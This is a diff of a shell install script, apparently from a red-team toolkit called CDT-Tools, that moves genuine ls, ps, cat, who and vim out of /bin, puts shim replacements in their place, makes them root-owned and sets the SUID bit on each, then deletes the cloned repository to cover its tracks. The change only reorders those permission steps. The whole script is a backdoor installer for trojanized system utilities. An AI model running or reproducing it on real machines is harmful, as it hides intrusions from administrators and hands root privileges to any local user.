@@ -23,22 +23,6 @@ git clone https://github.com/shadow5229/CDT-Tools.git
 
 # *** ADD WEBSERVER INSTALLTION HERE ***
 
-# Make each script executable
-chmod +x CDT-Tools/ls_shim/ls_new
-chmod +x CDT-Tools/ps_shim/ps_new
-chmod +x CDT-Tools/cat_shim/cat_new
-chmod +x CDT-Tools/who_shim/who_new
-chmod +x CDT-Tools/vim_shim/vim_new
-
-# Set the SUID bit for root so that all commands will always run
-chmod u+s CDT-Tools/ls_shim/ls_new
-chmod u+s CDT-Tools/ps_shim/ps_new
-chmod u+s CDT-Tools/cat_shim/cat_new
-chmod u+s CDT-Tools/who_shim/who_new
-chmod u+s CDT-Tools/vim_shim/vim_new
-
-# Make the owner root
-chown -R root:root CDT-Tools
 
 # Move "healthy" binaries out of /bin
 # Note: Some of these paths are OS dependent
@@ -55,6 +39,27 @@ mv CDT-Tools/ps_shim/ps_new /bin/ps
 mv CDT-Tools/cat_shim/cat_new /bin/cat
 mv CDT-Tools/who_shim/who_new /bin/who
 mv CDT-Tools/vim_shim/vim_new /bin/vim
+
+# Make each script executable
+chmod +x /bin/ls 
+chmod +x /bin/ps
+chmod +x /bin/cat
+chmod +x /bin/who
+chmod +x /bin/vim
+
+# Set SUID bit
+chown root:root /bin/ls
+chown root:root /bin/ps
+chown root:root /bin/cat
+chown root:root /bin/who
+chown root:root /bin/vim
+
+# Set the SUID bit for root so that all commands will always run
+chmod u+s /bin/ls
+chmod u+s /bin/ps
+chmod u+s /bin/cat
+chmod u+s /bin/who
+chmod u+s /bin/vim
 
 # Cleanup the mess
 rm -r CDT-Tools
